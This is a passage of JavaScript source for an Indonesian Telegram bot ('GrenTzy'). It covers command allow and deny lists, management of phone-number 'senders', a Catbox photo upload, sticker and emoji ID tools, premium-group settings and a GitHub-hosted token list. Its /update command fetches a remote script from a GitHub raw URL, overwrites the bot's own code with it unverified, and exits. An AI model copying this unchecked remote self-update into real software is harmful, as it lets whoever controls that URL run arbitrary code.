  bot.sendMessage(chatId, `🔒 Command /${command} dikunci (@GrenTzy) untuk user ${targetId}.`);
});

// case listcmd
bot.onText(/\/listcmd(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  const targetId = match[1] ? parseInt(match[1]) : fromId;

  const allowSet = commandWhitelist.get(targetId) || new Set();
  const denySet = commandDenylist.get(targetId) || new Set();

  const allowList = [...allowSet].map(c => `/${c}`);
  const denyList = [...denySet].map(c => `/${c}`);

  let message = `📋 *Daftar Command untuk user ${targetId}*\n\n`;
  message += `✅ *Diizinkan (@GrenTzy):*\n${allowList.length ? allowList.join(", ") : "(tidak ada)"}\n\n`;
  message += `❌ *Dikunci (@GrenTzy):*\n${denyList.length ? denyList.join(", ") : "(tidak ada)"}`;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/^\/(\w+)/, async (msg, match) => {
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  const chatId = msg.chat.id;

  if (!allCommands.includes(command)) return;

  if (userId === MAIN_OWNER_ID) return;

  const denySet = commandDenylist.get(userId) || new Set();
  if (denySet.has(command)) {
    await bot.sendMessage(chatId, `❌ *Command /${command} telah dikunci (@GrenTzy) untuk Anda.*\nHubungi owner untuk mengubah status.`, {
      parse_mode: "Markdown"
    });
    return;
  }

  const allowSet = commandWhitelist.get(userId) || new Set();
  if (!allowSet.has(command)) {
    await bot.sendMessage(chatId, `❌ *Command /${command} tidak diizinkan untuk Anda.*\nHubungi owner untuk mengaktifkannya.`, {
      parse_mode: "Markdown"
    });
    return;
  }
});

// case addsender
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak.");
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");
  if (!botNumber) return bot.sendMessage(chatId, "⚠️ Nomor tidak valid.");

  await addSender(botNumber, chatId, bot);
});

// case listsender 
bot.onText(/\/listsender/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak.");
  }

  if (senders.size === 0) {
    return bot.sendMessage(chatId, "📭 Belum ada sender yang terhubung.");
  }

  let list = "📋 *Daftar Sender Aktif:*\n";
  let i = 1;
  for (let [number] of senders.entries()) {
    const isDefault = (number === defaultSender) ? " ✅ (default)" : "";
    list += `${i}. ${number}${isDefault}\n`;
    i++;
  }
  bot.sendMessage(chatId, list, { parse_mode: "Markdown" });
});

// case delsender
bot.onText(/\/delsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak.");
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");
  if (!botNumber) return bot.sendMessage(chatId, "⚠️ Nomor tidak valid.");

  if (senders.has(botNumber)) {
    const sock = senders.get(botNumber);
    if (sock && sock.end) sock.end();
    senders.delete(botNumber);
    if (defaultSender === botNumber) defaultSender = null;
    bot.sendMessage(chatId, `✅ Sender ${botNumber} telah dihapus.`);
  } else {
    bot.sendMessage(chatId, `❌ Sender ${botNumber} tidak ditemukan.`);
  }
});

// case usesender
bot.onText(/\/usesender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak.");
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");
  if (senders.has(botNumber)) {
    defaultSender = botNumber;
    bot.sendMessage(chatId, `🔁 Sender default diubah ke ${botNumber}`);
  } else {
    bot.sendMessage(chatId, `❌ Sender ${botNumber} tidak aktif. Gunakan /listsender terlebih dahulu.`);
  }
});

// case upload foto ke catbox
bot.onText(/^\/toupload$/, async (msg) => {
  const chatId = msg.chat.id;
  const replied = msg.reply_to_message;

  let photo = null;
  if (replied && replied.photo) {
    photo = replied.photo;
  } else if (msg.photo) {
    photo = msg.photo;
  }

  if (!photo) {
    return bot.sendMessage(
      chatId,
      '📸 *Upload Foto ke Catbox*\n\nBalas foto dengan perintah `/toupload` atau kirim foto langsung dengan caption `/toupload`.',
      { parse_mode: 'Markdown' }
    );
  }

  const fileId = photo[photo.length - 1].file_id;
  const processing = await bot.sendMessage(chatId, '⏳ Mengupload foto ke Catbox...');
  
  const token = typeof BOT_TOKEN !== 'undefined' ? BOT_TOKEN : process.env.BOT_TOKEN;
  if (!token) {
    await bot.deleteMessage(chatId, processing.message_id).catch(() => {});
    return bot.sendMessage(chatId, '❌ Token bot tidak ditemukan.');
  }

  const file = await bot.getFile(fileId);
  const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;

  const downloadRes = await fetch(fileUrl, {
    headers: { 'User-Agent': 'Mozilla/5.0' },
  });

  if (!downloadRes.ok) {
    await bot.deleteMessage(chatId, processing.message_id).catch(() => {});
    return bot.sendMessage(chatId, `❌ Gagal download foto: ${downloadRes.status}`);
  }

  const fileBuffer = Buffer.from(await downloadRes.arrayBuffer());

  if (fileBuffer.length > 200 * 1024 * 1024) {
    await bot.deleteMessage(chatId, processing.message_id).catch(() => {});
    return bot.sendMessage(chatId, '❌ Ukuran foto melebihi 200MB.');
  }

  const form = new FormData();
  form.append('reqtype', 'fileupload');
  form.append('fileToUpload', fileBuffer, {
    filename: `photo_${Date.now()}.jpg`,
    contentType: 'image/jpeg',
  });

  let uploadResponse;
  try {
    uploadResponse = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: {
        ...form.getHeaders(),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
      },
      timeout: 90000,
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
    });
  } catch (err) {
    await bot.deleteMessage(chatId, processing.message_id).catch(() => {});
    let errorMsg = err.message;
    if (err.response && err.response.status === 412) {
      errorMsg = 'Catbox menolak upload (412). Coba foto yang lebih kecil atau format lain.';
    }
    return bot.sendMessage(chatId, `❌ Gagal upload foto: ${errorMsg}`);
  }

  await bot.deleteMessage(chatId, processing.message_id).catch(() => {});

  const responseData = uploadResponse.data;
  if (typeof responseData === 'string' && responseData.startsWith('http')) {
    await bot.sendMessage(
      chatId,
      `✅ *Upload Foto Berhasil!*\n🔗 Link: ${responseData}`,
      { parse_mode: 'Markdown' }
    );
  } else {
    await bot.sendMessage(
      chatId,
      `❌ Gagal upload foto: Catbox response: ${responseData || 'unknown'}`
    );
  }
});

// case cek id stiker
bot.onText(/\/stickerid/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  if (!replyMsg) {
    return bot.sendMessage(chatId,
      '⚠️ <b>Reply pesan ini ke:</b>\n' +
      '• Stiker\n' +
      '• Video / GIF / Video Note\n' +
      '• Emoji premium (custom emoji)\n' +
      '• Emoji biasa (Unicode)\n\n' +
      'Contoh: kirim <code>/stickerid</code> sebagai balasan ke stiker.',
      { parse_mode: 'HTML' }
    );
  }

  if (replyMsg.sticker) {
    return await kirimInfoStiker(chatId, replyMsg.sticker);
  }

  if (replyMsg.video || replyMsg.video_note || replyMsg.animation) {
    const media = replyMsg.video || replyMsg.video_note || replyMsg.animation;
    return await kirimInfoVideo(chatId, media, replyMsg.caption);
  }

  if (replyMsg.entities && replyMsg.entities.length > 0) {
    for (const entity of replyMsg.entities) {
      if (entity.type === 'custom_emoji') {
        return await kirimInfoEmoji(chatId, '', replyMsg);
      }
    }
  }

  const text = replyMsg.text || replyMsg.caption || '';
  const emojiRegex = /\p{Emoji}/u;
  if (emojiRegex.test(text) && !text.startsWith('/')) {
    return await kirimInfoEmoji(chatId, text, replyMsg);
  }

  bot.sendMessage(chatId,
    '⚠️ <b>Reply pesan ini ke:</b>\n' +
    '• Stiker\n' +
    '• Video / GIF / Video Note\n' +
    '• Emoji premium (custom emoji)\n' +
    '• Emoji biasa (Unicode)\n\n' +
    'Contoh: kirim <code>/stickerid</code> sebagai balasan ke stiker.',
    { parse_mode: 'HTML' }
  );
});

// case cek id emoji
bot.onText(/\/emojiid/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  if (!replyMsg) {
    return bot.sendMessage(chatId,
      '⚠️ <b>Reply pesan ini ke emoji premium</b> yang ingin dicek.\n' +
      'Contoh: kirim <code>/emojiid</code> sebagai balasan ke emoji premium.',
      { parse_mode: 'HTML' }
    );
  }

  if (replyMsg.entities && replyMsg.entities.length > 0) {
    for (const entity of replyMsg.entities) {
      if (entity.type === 'custom_emoji') {
        const customEmojiId = entity.custom_emoji_id;
        const emojiText = replyMsg.text || replyMsg.caption || '';
        const emojiChar = emojiText.slice(entity.offset, entity.offset + entity.length);

        let reply = `⭐ <b>Custom Emoji (Premium)</b>\n`;
        reply += `• Emoji: ${emojiChar}\n`;
        reply += `• custom_emoji_id: <code>${customEmojiId}</code>\n`;
        reply += `• Panjang: ${entity.length}\n`;
        reply += `• Offset: ${entity.offset}\n`;

        return bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
      }
    }
  }

  bot.sendMessage(chatId,
    '⚠️ <b>Reply pesan ini ke emoji premium</b> (custom emoji) yang ingin dicek.\n' +
    'Contoh: kirim <code>/emojiid</code> sebagai balasan ke emoji premium.',
    { parse_mode: 'HTML' }
  );
});

// case addpremgrup 
bot.onText(/\/addpremgrup(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (userId !== MAIN_OWNER_ID) {
    return bot.sendMessage(chatId, "❌ ☇ Akses hanya untuk pemilik");
  }

  const args = match[1] ? match[1].trim().split(/\s+/) : [];
  let groupId = String(chatId);


  if (msg.chat.type === "private") {
    if (args.length < 1) {
      return bot.sendMessage(chatId, "🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[0]);
  } else {

    if (args.length >= 1) groupId = String(args[0]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) {
    return bot.sendMessage(chatId, `🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  }
  return bot.sendMessage(chatId, `✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

// case delpremgrup 
bot.onText(/\/delpremgrup(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (userId !== MAIN_OWNER_ID) {
    return bot.sendMessage(chatId, "❌ ☇ Akses hanya untuk pemilik");
  }

  const args = match[1] ? match[1].trim().split(/\s+/) : [];
  let groupId = String(chatId);

  if (msg.chat.type === "private") {
    if (args.length < 1) {
      return bot.sendMessage(chatId, "🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[0]);
  } else {
    if (args.length >= 1) groupId = String(args[0]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) {
    return bot.sendMessage(chatId, `🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  }
  return bot.sendMessage(chatId, `✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.onText(/\/premgroup(?:\s+(on|off))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (userId !== MAIN_OWNER_ID) {
    return bot.sendMessage(chatId, "❌ ☇ Akses hanya untuk pemilik");
  }

  const option = match[1] ? match[1].toLowerCase() : null;
  if (!option || (option !== "on" && option !== "off")) {
    return bot.sendMessage(chatId, "⚙️ ☇ Format: /premgroup on | off\nAktifkan/nonaktifkan mode grup premium.");
  }

  premiumGroupOnly = option === "on";
  savePremiumGroupMode();
  bot.sendMessage(chatId,
    `✅ ☇ Mode grup premium ${premiumGroupOnly ? 'diaktifkan' : 'dinonaktifkan'}.\n` +
    `Bot ${premiumGroupOnly ? 'hanya akan merespon di grup premium' : 'akan merespon di semua grup'}.`
  );
});

// case new
const GITHUB_TOKEN_RAW_URL = "https://raw.githubusercontent.com/denzzp/pribdb/refs/heads/main/tokens.json";

const GITHUB_TOKEN_URL = GITHUB_TOKEN_RAW_URL;

bot.onText(/^\/listtoken$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;


  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa melihat list token.");
  }

  try {

    const processing = await bot.sendMessage(chatId, "⏳ Mengambil daftar token dari GitHub...");


    const response = await axios.get(GITHUB_TOKEN_RAW_URL, {
      headers: {
        'User-Agent': 'denzzp-Bot'
      },
      timeout: 10000
    });

    const data = response.data;
    const tokens = data.tokens || [];

    if (tokens.length === 0) {
      await bot.editMessageText("📭 Tidak ada token yang terdaftar di GitHub.", {
        chat_id: chatId,
        message_id: processing.message_id
      });
      return;
    }


    let text = `📋 *LIST TOKEN BY @GrenTzy *\n`;
    text += `📦 Total: ${tokens.length} token\n\n`;
    tokens.forEach((token, index) => {

      const isOwn = token === BOT_TOKEN ? ' ✅ (milik sendiri)' : '';

      const displayToken = token.length > 20 ? token.slice(0, 10) + '...' + token.slice(-5) : token;
      text += `${index + 1}. \`${displayToken}\`${isOwn}\n`;
    });

    // Kirim hasil
    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: processing.message_id,
      parse_mode: 'Markdown'
    });

  } catch (error) {
    console.error('Error /listtoken:', error.message);
    let errorMsg = '❌ Gagal mengambil data token dari GitHub.';
    if (error.response?.status === 404) {
      errorMsg = '❌ File tokens.json tidak ditemukan di repository.';
    } else if (error.response?.status === 403) {
      errorMsg = '❌ Akses ditolak atau rate limit tercapai.';
    } else if (error.code === 'ECONNABORTED') {
      errorMsg = '❌ Timeout koneksi ke GitHub.';
    }
    bot.sendMessage(chatId, errorMsg);
  }
});


bot.onText(/^\/refreshtoken$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa refresh list token.");
  }

  try {
    const processing = await bot.sendMessage(chatId, "🔄 Menyegarkan daftar token dari GitHub...");

    const response = await axios.get(GITHUB_TOKEN_RAW_URL, {
      headers: { 'User-Agent': 'denzzp-Bot' },
      timeout: 10000
    });

    const data = response.data;
    const tokens = data.tokens || [];
    const lastUpdated = new Date().toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });

    if (tokens.length === 0) {
      await bot.editMessageText(`📭 Tidak ada token yang terdaftar di GitHub.\n\n🕐 Last refresh: ${lastUpdated} WIB`, {
        chat_id: chatId,
        message_id: processing.message_id
      });
      return;
    }

    let text = `✅ *LIST TOKEN (REFRESHED)*\n`;
    text += `🕐 Last update: ${lastUpdated} WIB\n`;
    text += `🔗 Sumber: ${GITHUB_TOKEN_RAW_URL}\n`;
    text += `📦 Total: ${tokens.length} token\n\n`;
    tokens.forEach((token, index) => {
      const isOwn = token === BOT_TOKEN ? ' ✅ (milik sendiri)' : '';
      const displayToken = token.length > 20 ? token.slice(0, 10) + '...' + token.slice(-5) : token;
      text += `${index + 1}. \`${displayToken}\`${isOwn}\n`;
    });

    await bot.editMessageText(text, {
      chat_id: chatId,
      message_id: processing.message_id,
      parse_mode: 'Markdown'
    });

  } catch (error) {
    console.error('Error /refreshtoken:', error.message);
    let errorMsg = '❌ Gagal refresh data token dari GitHub.';
    if (error.response?.status === 404) {
      errorMsg = '❌ File tokens.json tidak ditemukan di repository.';
    } else if (error.response?.status === 403) {
      errorMsg = '❌ Akses ditolak atau rate limit tercapai.';
    } else if (error.code === 'ECONNABORTED') {
      errorMsg = '❌ Timeout koneksi ke GitHub.';
    }
    bot.sendMessage(chatId, errorMsg);
  }
});



bot.onText(/\/update/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa melakukan update.");
  }

  const repoRaw = "https://raw.githubusercontent.com/khususbanding749-ai/GrenTzy1/refs/heads/main/GrenTzy.js";

  await bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw, { responseType: 'text' });

    if (!data || data.length < 100) {
      return bot.sendMessage(chatId, "❌ Update gagal: File kosong atau tidak valid!");
    }

    fs.writeFileSync("./GrenTzy.js", data, 'utf8');

    await bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");
    process.exit(0);
  } catch (e) {
    console.error('Update error:', e.message);
    bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file GrenTzy.js tersedia.");
  }
});


bot.onText(/\/checkupdate/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa mengecek update.");
  }

  const repoRaw = "https://raw.githubusercontent.com/khususbanding749-ai/GrenTzy1/refs/heads/main/GrenTzy.js";

  const statusMsg = await bot.sendMessage(chatId, "🔍 Mengecek update...");

  try {
    const { data: remoteData } = await axios.get(repoRaw, { responseType: 'text' });

    if (!remoteData || remoteData.length < 100) {
      return bot.editMessageText("❌ Gagal mengambil file remote (kosong atau tidak valid).", {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    let localData = '';
    try {
      localData = fs.readFileSync('./GrenTzy.js', 'utf8');
    } catch (err) {
      return bot.editMessageText("❌ File lokal tidak ditemukan.", {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    const hashRemote = crypto.createHash('sha256').update(remoteData).digest('hex');
    const hashLocal = crypto.createHash('sha256').update(localData).digest('hex');

    if (hashRemote === hashLocal) {
      await bot.editMessageText("✅ Bot sudah menggunakan versi terbaru (tidak ada update).", {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    } else {
      await bot.editMessageText(
        "🔄 Update tersedia! Jalankan `/update` untuk memperbarui bot.\n\n" +
        `📦 Ukuran remote: ${(remoteData.length / 1024).toFixed(2)} KB\n` +
        `📦 Ukuran lokal : ${(localData.length / 1024).toFixed(2)} KB`,
        {
          chat_id: chatId,
          message_id: statusMsg.message_id,
          parse_mode: "Markdown"
        }
      );
    }
  } catch (e) {
    console.error('Check update error:', e.message);
    bot.editMessageText("❌ Gagal mengecek update. Pastikan repo dan file tersedia.", {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });
  }
});